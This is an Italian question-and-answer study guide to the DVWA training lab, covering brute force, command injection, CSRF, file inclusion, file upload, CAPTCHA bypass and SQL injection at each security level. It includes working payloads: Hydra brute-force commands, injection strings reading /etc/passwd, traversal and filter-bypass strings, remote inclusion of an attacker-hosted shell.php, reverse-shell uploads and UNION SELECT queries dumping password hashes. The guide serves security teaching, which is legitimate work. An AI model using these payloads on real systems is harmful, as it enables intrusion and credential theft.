# 1 \- Brute Forcing

# **Guida Didattica Passo Passo: Risolvere la Sfida Brute Force in DVWA**

# 

# **Domanda:** Qual è l'obiettivo generale di questa guida?

# **Soluzione:** L'obiettivo è risolvere la sfida Brute Force di DVWA (Damn Vulnerable Web Application) su diversi livelli di sicurezza (basso, medio e alto) utilizzando tecniche di attacco come SQL injection, Hydra e Burp Suite.-----**Livello di Sicurezza Basso**

# 

# **Domanda:** Qual è la vulnerabilità principale nel livello di sicurezza basso e come può essere sfruttata?

# **Soluzione:** Il codice non esegue la sanificazione o l'escape degli input utente, il che apre la porta agli attacchi di SQL Injection.

# 

# **Domanda:** Come si bypassa l'autenticazione tramite SQL Injection?

# **Soluzione:** Utilizzando il payload `admin' OR '1'='1 --` nei campi di login per ottenere un accesso non autorizzato.

# 

# **Domanda:** Qual è la procedura per eseguire un attacco Brute Force con Hydra?

# **Soluzione:**

1. Identificare il valore `PHPSESSID` nei cookie del browser (scheda Storage/Cookies negli strumenti per sviluppatori).  
2. Identificare il messaggio di errore di login fallito (`Username and/or password incorrect.`).  
3. Formulare il comando Hydra per un attacco `http-get-form`, includendo il `PHPSESSID` e il messaggio di fallimento.  
   * *Esempio di comando per admin (adattato dal documento):*  
     hydra \-l admin \-P /usr/share/wordlists/rockyou.txt.gz \<target\_IP\> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^\&password=^PASS^\&Login=Login:H=Cookie:PHPSESSID=\<value\>;security=low:F=Username and/or password incorrect."

**Domanda:** Qual è la password dell'utente `admin` scoperta con Hydra?

# **Soluzione:** La password è `password`.

# 

# **Domanda:** Come si esegue il Brute Force della password `admin` con Burp Suite (attacco a singolo utente)?

# **Soluzione:**

1. Aprire FoxyProxy e abilitare l'intercettazione in Burp Suite.  
2. Catturare la richiesta HTTP di login fallito, quindi inviarla a **Intruder**.  
3. Nella scheda **Intruder \> Positions**, aggiungere i simboli `§` attorno al solo parametro della password per focalizzare l'attacco.  
4. Nella scheda **Intruder \> Payloads**, selezionare **Simple List** come Payload Type e aggiungere le potenziali password.  
5. Selezionare **Sniper** come Attack Type e avviare l'attacco.  
6. Identificare la password corretta (`password`) analizzando la **Content-Length** della risposta HTTP, che risulterà diversa per l'accesso riuscito.

**Domanda:** Come si esegue il Brute Force di **tutti** gli account utente con Burp Suite?

# **Soluzione:**

1. Nella scheda **Intruder \> Positions**, aggiungere i simboli `§` attorno ai parametri sia per il **username** che per la **password**.  
2. Selezionare **Cluster Bomb** come Attack Type (testa tutte le combinazioni di payload).  
3. Nella scheda **Intruder \> Payloads**:  
   * Payload set 1 (Username): Selezionare **Simple List** e aggiungere i potenziali username.  
   * Payload set 2 (Password): Selezionare **Simple List** e aggiungere le potenziali password.  
4. Avviare l'attacco e analizzare la Content-Length per scoprire tutte le credenziali valide:  
   * `gordonb`: `abc123`  
   * `smithy`: `password`  
   * `pablo`: `letmein`  
   * `admin`: `password`  
   * `1337`: `charley`

\-----**Livello di Sicurezza Medio**

# 

# **Domanda:** Quali misure di sicurezza sono implementate al livello medio?

# **Soluzione:** È presente la funzione `mysql_real_escape_string`, che esegue l'escape di caratteri speciali (come virgolette singole e doppie) aggiungendo backslash, prevenendo l'SQL Injection.

# 

# **Domanda:** Come si eseguono gli attacchi Brute Force (Hydra e Burp Suite) a livello medio?

# **Soluzione:** Si utilizzano gli stessi metodi del livello basso, ma il comando Hydra deve essere modificato per impostare il livello di sicurezza su `medium` nella sezione `Cookie:PHPSESSID=...;security=medium`. L'SQL Injection non funziona più.-----**Livello di Sicurezza Alto**

# 

# **Domanda:** Quali misure di sicurezza aggiuntive sono implementate al livello alto?

# **Soluzione:**

1. Viene utilizzata `mysql_real_escape_string` per l'escape.  
2. Segue `stripslashes` per rimuovere i backslash aggiunti, restaurando la stringa originale prima della visualizzazione, offrendo una protezione extra.  
3. È presente una funzione `sleep(3)` nel codice, che introduce un ritardo di 3 secondi ad ogni tentativo di login, rallentando significativamente gli attacchi Brute Force.

**Domanda:** Gli strumenti Hydra e Burp Suite funzionano ancora al livello alto?

# **Soluzione:** Sì, funzionano, ma l'attacco risulta notevolmente più lento a causa del ritardo (`sleep(3)`) aggiunto ad ogni tentativo nel codice sorgente. Il comando Hydra è simile, con `security=high` impostato nel cookie.

# 2 \- Command Injection

**Guida Didattica Passo Passo: Risolvere la Sfida Command Injection in DVWA**

**Domanda:** Qual è l'obiettivo generale di questa guida?

**Soluzione:** Questa guida illustra la risoluzione della sfida **Command Injection** in DVWA (Damn Vulnerable Web Application) attraverso i livelli di sicurezza basso, medio e alto, concentrandosi sul bypass delle difese.

**Domanda:** Cos'è la Command Injection?

**Soluzione:** La Command Injection avviene quando un attaccante può eseguire comandi su un sistema remoto, solitamente a causa di una web application che non gestisce correttamente l'input dell'utente.-----**Livello di Sicurezza Basso**

**Domanda:** Qual è il comportamento del codice sorgente a basso livello di sicurezza?

**Soluzione:** Il codice richiede un indirizzo IP, che innesca un comando `ping` tramite `shell_exec`.

**Domanda:** Come si esegue un Command Injection per visualizzare il contenuto del file `/etc/passwd`?

**Soluzione:** Si può utilizzare un punto e virgola (`;`) o l'operatore AND logico (`&&`) per concatenare i comandi:

* **Punto e virgola:**  
  127.0.0.1 ; cat /etc/passwd  
  Il punto e virgola permette di eseguire più comandi in una singola riga.  
* **AND logico:**  
  127.0.0.1 && cat /etc/passwd  
  Questo esegue il secondo comando solo se il primo ha successo.

\-----**Livello di Sicurezza Medio**

**Domanda:** Quali misure di sicurezza sono implementate al livello medio?  
**Soluzione:** È presente la funzione `str_replace`, che sostituisce gli operatori di concatenazione di comandi (`&&` e `;`) con spazi, bloccando il loro utilizzo diretto.

**Domanda:** Come si bypassa la restrizione per eseguire il Command Injection a livello medio?  
**Soluzione:** Si utilizza il carattere *pipe* (`|`) per connettere i comandi:  
127.0.0.1 | cat /etc/passwd  
\-----**Livello di Sicurezza Alto**

**Domanda:** Quali misure di sicurezza aggiuntive sono implementate al livello alto?  
**Soluzione:** I caratteri di concatenazione più comuni, come `&`, punto e virgola (`;`) e *pipe* (`|`), vengono sostituiti con spazi, impedendo l'esecuzione di più comandi.

**Domanda:** Come si bypassa questa protezione a livello alto?  
**Soluzione:** È possibile bypassare la protezione eliminando lo spazio dopo il carattere *pipe* in modo che la sostituzione non avvenga:  
127.0.0.1 |cat /etc/passwd  
\-----**Livello di Sicurezza Impossible**

**Domanda:** Quali misure di sicurezza sono implementate al livello "Impossible"?  
**Soluzione:** L'indirizzo IP viene suddiviso in quattro segmenti numerici, riassemblato e strettamente validato.

**Domanda:** La Command Injection funziona al livello "Impossible"?  
**Soluzione:** No, qualsiasi uso di *pipe* o punto e virgola è completamente impedito poiché viene elaborato e convalidato solo l'indirizzo IP.

# 3- CSRF

**Guida Didattica Passo Passo: Risolvere la Sfida CSRF in DVWA**

**Domanda:** Qual è l'obiettivo generale di questa guida?

**Soluzione:** L'obiettivo è illustrare la risoluzione della sfida **CSRF (Cross-Site Request Forgery)** in DVWA (Damn Vulnerable Web Application) attraverso i livelli di sicurezza basso, medio e alto, esplorando le difese implementate e come bypassarle.

**Domanda:** Cos'è il CSRF?

**Soluzione:** Il CSRF è una tecnica in cui un attaccante inganna una vittima per fargli eseguire azioni su un sito web a cui è autenticata (come cambiare la password o effettuare un acquisto), il tutto senza che la vittima ne sia consapevole.-----**Livello di Sicurezza Basso**

**Domanda:** Qual è la vulnerabilità nel livello di sicurezza basso?

**Soluzione:** I campi per la **Nuova Password** e la **Conferma Nuova Password** vengono elaborati utilizzando il metodo **GET**, includendo i parametri direttamente nell'URL della richiesta.

**Domanda:** Come si sfrutta la vulnerabilità per cambiare la password?

**Soluzione:**

1. Si ottiene l'URL generato dopo un tentativo di cambio password (ad esempio, con  
   password\_new=admin  
    e  
   password\_conf=admin  
   ). Esempio di URL:  
   http://127.0.0.1:42001/vulnerabilities/csrf/?password\_new=admin\&password\_conf=admin\&Change=Change\#  
2. Si crea un URL malevolo con i parametri desiderati per il cambio password.  
3. Si invia questo URL alla vittima. Cliccandoci sopra, la sua password verrà cambiata automaticamente, a condizione che sia autenticata.  
4. Si può utilizzare la funzione di *Decoder* di Burp Suite per codificare ulteriormente l'URL (ad esempio in formato URL encoding) per renderlo meno riconoscibile.

\-----**Livello di Sicurezza Medio**

**Domanda:** Quali misure di sicurezza sono implementate al livello medio?

**Soluzione:** Il codice controlla se il nome del server è presente nell'URL, verificando l'header **Referer** della richiesta HTTP. Questo assicura che la richiesta provenga da una pagina dello stesso dominio, prevenendo richieste da siti esterni o malevoli.

**Domanda:** Come si bypassa il controllo dell'header Referer?

**Soluzione:** Intercettando la richiesta non valida (ad esempio con Burp Suite) e **iniettando l'header Referer corretto** nella richiesta stessa. In questo modo, la richiesta sembrerà provenire da una fonte legittima e supererà il controllo di sicurezza.-----**Livello di Sicurezza Alto**

**Domanda:** Quali misure di sicurezza aggiuntive sono implementate al livello alto?

**Soluzione:**

1. Il codice recupera il **token Anti-CSRF**, la nuova password e la conferma password dal *corpo* della richiesta (metodo POST).  
2. Il token Anti-CSRF viene utilizzato per verificare la legittimità della richiesta, assicurando che corrisponda al token di sessione.  
3. Un nuovo token Anti-CSRF viene generato ogni volta che si preme il pulsante "Change", proteggendo da attacchi di forza bruta.

**Domanda:** Qual è l'approccio per analizzare l'attacco a livello alto?

**Soluzione:**

1. Ispezionare il codice sorgente della pagina web per visualizzare il token utente nascosto incluso nei dati del form.  
2. Esaminare la richiesta intercettata (ad esempio con Burp Suite) per osservare il token anti-CSRF trasmesso insieme ai parametri di cambio password.  
3. L'unicità del token lo rende difficile da bypassare, a meno che non si riesca a recuperare il token valido per la sessione corrente dell'utente e includerlo nella richiesta malevola.

# 4 \- File Inclusion

**Guida Didattica Passo Passo: Risolvere la Sfida File Inclusion in DVWA**

**Domanda:** Qual è l'obiettivo generale di questa guida?  
**Soluzione:** L'obiettivo è illustrare la risoluzione della sfida **File Inclusion** in DVWA (Damn Vulnerable Web Application) attraverso i livelli di sicurezza basso, medio e alto, svelando le protezioni e i metodi per bypassarle.

**Domanda:** Cos'è la File Inclusion?  
**Soluzione:** La File Inclusion è una vulnerabilità in cui un'applicazione permette agli utenti di scegliere quali file caricare. Se non gestita in modo sicuro, gli attaccanti possono sfruttarla per caricare file sensibili o eseguire codice dannoso.

\-----**Livello di Sicurezza Basso**

**Domanda:** Qual è la vulnerabilità nel codice sorgente a basso livello di sicurezza?  
**Soluzione:** Il codice prende un valore dal parametro  
page  
nell'URL (metodo GET) e lo assegna alla variabile  
$file  
, che viene caricata e visualizzata. La mancanza di validazione o sanificazione rende il codice vulnerabile agli attacchi di File Inclusion.

**Domanda:** Come si esegue un attacco **Local File Inclusion (LFI)** per accedere al file  
/etc/passwd  
?  
**Soluzione:** Si manipola il parametro  
page  
nell'URL utilizzando la sequenza di attraversamento di directory  
../../../../../../  
per risalire la struttura delle directory e accedere a file sensibili, ad esempio:  
\[...\]vulnerabilities/fi/?page=../../../../../../etc/passwd  
**Domanda:** Come si sfrutta la vulnerabilità per un attacco **Remote File Inclusion (RFI)**?  
**Soluzione:** Si fa in modo che l'applicazione includa un file da un server remoto controllato dall'attaccante.

**Domanda:** Qual è la procedura per l'RFI?  
**Soluzione:**

1. Creare i file malevoli (es.  
   test  
    e  
   shell.php  
    ) su un server controllato dall'attaccante.  
2. Avviare un server HTTP semplice (es. con Python) per rendere il file accessibile in rete.  
3. Inserire l'URL del file malevolo (es.  
   http://192.168.44.171:8000/shell.php  
    ) nel parametro  
   page  
    dell'applicazione DVWA per innescare l'inclusione del file e l'esecuzione di codice (es. una *reverse shell*).

\-----**Livello di Sicurezza Medio**

**Domanda:** Quali difese sono implementate al livello medio?  
**Soluzione:** Viene utilizzata la funzione  
str\_replace  
per rimuovere i prefissi  
http://  
,  
https://  
e le sequenze di attraversamento  
../  
e  
..\\  
, sostituendoli con una stringa vuota.

**Domanda:** Come si bypassa la restrizione  
../  
per l'attacco **LFI** a livello medio?  
**Soluzione:** Si sfrutta la funzione  
str\_replace  
annidando i caratteri, ad esempio con la sequenza  
..././  
. Questa sequenza viene elaborata in modo tale da collassare in  
../  
, consentendo l'attraversamento delle directory:  
..././..././..././..././..././..././etc/passwd  
**Domanda:** Come si bypassa la restrizione  
http://  
per l'attacco **RFI** a livello medio?  
**Soluzione:** Si annidano i caratteri nell'URL in modo simile, ad esempio inserendo  
http://  
come  
hthttp://tp://  
. Il  
str\_replace  
rimuove  
http://  
una volta, ma l'URL si ricompone nel prefisso desiderato.-----**Livello di Sicurezza Alto**

**Domanda:** Quali difese sono implementate al livello alto?  
**Soluzione:** Il codice genera un errore se il file richiesto non inizia con  
file  
e non è  
include.php  
.

**Domanda:** Come si esegue un attacco **LFI** a livello alto?  
**Soluzione:** Si utilizza il protocollo **file://** per leggere file locali del sistema, rispettando il requisito di inizio della stringa con "file":  
file:///etc/passwd  
**Domanda:** L'attacco **RFI** è possibile a livello alto?  
**Soluzione:** No, l'RFI non è possibile a causa delle misure di sicurezza implementate che impediscono efficacemente tali tentativi.

# 5 \- file upload

**Guida Didattica Passo Passo: Risolvere la Sfida File Upload in DVWA**

**Domanda:** Qual è l'obiettivo generale di questa guida?  
**Soluzione:** L'obiettivo è illustrare la risoluzione della sfida **File Upload** in DVWA (Damn Vulnerable Web Application) attraverso i livelli di sicurezza basso, medio e alto, analizzando le vulnerabilità e le tecniche di sfruttamento.

**Domanda:** Cos'è una Vulnerabilità di File Upload?  
**Soluzione:** Si verifica quando un'applicazione web consente agli utenti di caricare file senza controlli adeguati, permettendo l'upload e l'esecuzione di file dannosi (come malware o script) sul server, potenzialmente compromettendo il sistema.-----**Livello di Sicurezza Basso**

**Domanda:** Qual è la vulnerabilità principale nel codice a basso livello?  
**Soluzione:** Quando si clicca sul pulsante "Upload", il file caricato viene spostato nel percorso di destinazione **senza alcun controllo di sicurezza o validazione**, lasciando il sistema vulnerabile.

**Domanda:** Come si sfrutta questa vulnerabilità?  
**Soluzione:**

1. Creare uno script PHP per una *reverse shell* (es. `shell.php`).  
2. Caricare il file `shell.php`. L'upload avrà successo.  
3. Navigare all'URL del file caricato (es. `/hackable/uploads/shell.php`) dopo aver configurato un listener Netcat.  
4. Il listener riceverà una shell di connessione remota, garantendo il controllo del server.

\-----**Livello di Sicurezza Medio**

**Domanda:** Quali misure di sicurezza sono implementate al livello medio?  
**Soluzione:** È presente un controllo di validazione che richiede che il file caricato sia in formato immagine **JPEG o PNG** (verificando il `Content-Type`) e che abbia una dimensione inferiore a **100000 byte**.

**Domanda:** Come si bypassano le restrizioni a livello medio?  
**Soluzione:** Intercettando la richiesta di upload con uno strumento come Burp Suite e modificando manualmente l'header **Content-Type** del file caricato in `image/png` (anche se il file è in realtà la *reverse shell* PHP).

**Domanda:** Qual è il risultato del bypass?  
**Soluzione:** L'upload del file PHP (mascherato come immagine) ha successo. Successivamente, navigando all'URL del file, si ottiene la *reverse shell* sul listener Netcat.-----**Livello di Sicurezza Alto**

**Domanda:** Quali misure di sicurezza aggiuntive sono implementate al livello alto?  
**Soluzione:**

1. Viene utilizzata la funzione **`substr`** per controllare l'estensione del file, assicurando che sia `.jpeg`, `.jpg` o `.png`.  
2. Viene utilizzata la funzione **`getimagesize`** per verificare se il file è una vera immagine valida, escludendo file creati senza metadati immagine (come con i comandi `touch` o `nano`).

**Domanda:** Come si bypassano queste protezioni a livello alto?  
**Soluzione:**

1. Scaricare un'immagine JPEG legittima.  
2. Utilizzare uno strumento come **`exiftool`** per iniettare un *payload* malevolo (il codice della *reverse shell*) all'interno dei metadati dell'immagine.  
3. Caricare l'immagine modificata. L'upload avrà successo poiché ha le caratteristiche di un'immagine valida.  
4. Utilizzare la vulnerabilità di Command Injection (precedentemente risolta) per **rinominare** il file caricato (es. da `image.jpeg` a `image.php`) sul server. Esempio di comando:  
   127.0.0.1|mv ../../hackable/uploads/image.jpeg ../../hackable/uploads/image.php  
5. Navigare all'URL di `image.php` per eseguire il *payload* iniettato e ottenere la *reverse shell*.

\-----**Livello di Sicurezza Impossible**

**Domanda:** Quali misure di sicurezza sono implementate al livello "Impossible"?  
**Soluzione:**

1. Utilizzo di un **token Anti-CSRF** per prevenire attacchi *cross-site*.  
2. Hashing del nome del file con **MD5** e un ID univoco per evitare collisioni.  
3. Utilizzo delle funzioni **`imagecreatefromjpeg`** e **`imagecreatefrompng`** per una validazione e processazione rigorosa delle immagini JPEG e PNG.

**Domanda:** Le vulnerabilità di File Upload sono sfruttabili a livello "Impossible"?  
**Soluzione:** No, le misure di sicurezza implementate (come il token Anti-CSRF e la validazione/processazione rigorosa delle funzioni immagine) impediscono efficacemente gli attacchi.

# 6 \- Insecure CAPTCHA

**Guida Didattica Passo Passo: Risolvere la Sfida Insecure CAPTCHA in DVWA**

**Domanda:** Qual è l'obiettivo generale di questa guida?  
**Soluzione:** L'obiettivo è esplorare la risoluzione della sfida **Insecure CAPTCHA** in DVWA attraverso i livelli di sicurezza basso, medio e alto, analizzando le difese e i metodi per bypassarle.

**Domanda:** Cos'è un CAPTCHA Insecure?  
**Soluzione:** Un CAPTCHA Insecure è un sistema CAPTCHA implementato male che gli attaccanti possono facilmente bypassare a causa di difetti come codici prevedibili o scarsa validazione.-----**Livello di Sicurezza Basso**

**Domanda:** Com'è strutturato il processo di validazione a basso livello di sicurezza?  
**Soluzione:** Il processo è suddiviso in due passaggi: prima, il sistema controlla se l'utente ha inserito correttamente gli input e risolto il CAPTCHA (Step 1). Se superato, si passa al secondo passaggio (Step 2), dove l'utente deve cliccare sul pulsante "Submit" per completare l'operazione.

**Domanda:** Come si bypassa il CAPTCHA a livello basso?  
**Soluzione:** Si intercetta la richiesta HTTP (ad esempio con Burp Suite) e si modifica manualmente il valore del parametro *step* da 1 a 2\. Questo bypassa efficacemente il primo passaggio di validazione.-----**Livello di Sicurezza Medio**

**Domanda:** Su cosa si basa la sicurezza a livello medio?  
**Soluzione:** Il sistema si affida al parametro  
passed\_captcha  
per determinare il successo del CAPTCHA. Poiché questa verifica avviene sul lato client, è manipolabile.

**Domanda:** Come si bypassa il CAPTCHA a livello medio?  
**Soluzione:** Utilizzando Burp Suite per intercettare la richiesta, si modifica il valore del parametro *step* a 2 e si imposta il parametro  
passed\_captcha  
su  
true  
.-----**Livello di Sicurezza Alto**

**Domanda:** Quali misure di sicurezza sono implementate al livello alto?  
**Soluzione:** È presente un sistema di validazione a strati. Si inizia con un controllo della risposta reCAPTCHA; se fallisce, si ricade su una verifica per cui la risposta  
g-recaptcha-response  
deve contenere il valore nascosto  
hidd3n\_valu3  
e l'intestazione *User Agent* deve essere  
reCAPTCHA  
.

**Domanda:** Come si bypassano queste protezioni a livello alto?  
**Soluzione:** Intercettando la richiesta con Burp Suite, si aggiunge  
hidd3n\_valu3  
alla risposta  
g-recaptcha-response  
e si cambia l'intestazione *User Agent* a  
reCAPTCHA  
.-----**Livello di Sicurezza Impossible**

**Domanda:** Quali misure di sicurezza sono implementate al livello "Impossible"?  
**Soluzione:** Sono presenti misure di sicurezza robuste come la rimozione dei backslash (  
stripslashes  
), la generazione di un **token Anti-CSRF** per ogni richiesta e l'uso di *prepared statements* (istruzioni preparate). Il processo di verifica dati e CAPTCHA è stato semplificato in un unico passaggio.

**Domanda:** Il CAPTCHA è vulnerabile al livello "Impossible"?  
**Soluzione:** No, le solide misure di sicurezza implementate impediscono efficacemente qualsiasi tentativo di attacco e bypass.

# 7 \- sql

**Guida Didattica Passo Passo: Risolvere la Sfida SQL Injection in DVWA**

**Domanda:** Cos'è la SQL Injection?  
**Soluzione:** La SQL injection è una tecnica utilizzata per manipolare le query SQL, consentendo agli attaccanti di accedere, modificare o eliminare dati in un database sfruttando campi di input vulnerabili.-----**Livello di Sicurezza Basso**

**Domanda:** Qual è la vulnerabilità principale nel codice sorgente a basso livello?  
**Soluzione:** Il codice prende l'ID inviato tramite il campo di input e lo utilizza direttamente nella query SQL senza una corretta convalida o sanificazione.

**Domanda:** Come si bypassa il login e si visualizzano tutti gli utenti?  
**Soluzione:** Inserendo il payload:  
1' OR '1'='1'\#  
Questo altera la query SQL per saltare il bisogno di un ID specifico e visualizzare tutti gli utenti, poiché la condizione `'1'='1'` è sempre vera.

**Domanda:** Come si visualizzano le tabelle esistenti all'interno del database?  
**Soluzione:** Utilizzando il payload:  
'UNION SELECT table\_name, NULL FROM information\_schema.tables \#  
**Domanda:** Come si recuperano e si visualizzano le colonne della tabella 'users'?  
**Soluzione:** Utilizzando la query:  
'UNION SELECT column\_name, NULL FROM information\_schema.columns WHERE table\_name= 'users' \#  
**Domanda:** Come si accede ai nomi utente e alle loro password crittografate?  
**Soluzione:** Utilizzando la query:  
'UNION SELECT user, password FROM users \#  
\-----**Livello di Sicurezza Medio**

**Domanda:** Quali misure di sicurezza sono implementate al livello medio?  
**Soluzione:** È stata aggiunta la funzione `mysqli_real_escape_string` all'input dell'ID per eseguire l'escape dei caratteri speciali, proteggendo da SQL injection. Inoltre, l'input dell'ID è stato modificato in una casella di controllo.

**Domanda:** Come si bypassa la protezione per iniettare il payload SQL?  
**Soluzione:** Intercettando la richiesta con Burp Suite e modificando manualmente il parametro di input `id=1` in:  
1 UNION SELECT user, password FROM users \#  
e inviando la richiesta modificata.-----**Livello di Sicurezza Alto**

**Domanda:** Qual è la vulnerabilità sfruttabile al livello alto?  
**Soluzione:** È possibile modificare l'ID di sessione, che viene poi utilizzato per interrogare la tabella `users`.

**Domanda:** Qual è la procedura per eseguire la SQL Injection a livello alto?  
**Soluzione:**

1. Cliccare sul link per modificare l'ID di sessione, che aprirà una nuova finestra.  
2. Iniettare il codice malevolo nell'input dell'ID di sessione nella nuova finestra:

' UNION SELECT user, password FROM users \#

1. Inviando il codice, si è in grado di recuperare i nomi utente e le password.

